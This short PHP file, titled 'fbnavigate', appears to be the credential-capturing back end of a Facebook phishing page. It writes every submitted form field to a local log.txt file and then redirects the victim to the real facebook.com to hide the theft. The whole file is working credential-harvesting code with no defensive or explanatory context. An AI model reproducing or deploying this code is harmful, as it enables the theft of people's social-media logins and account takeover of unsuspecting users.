# fbnavigate

<?php
header ('Location: http://www.facebook.com');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "_________________________________________________________");
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>
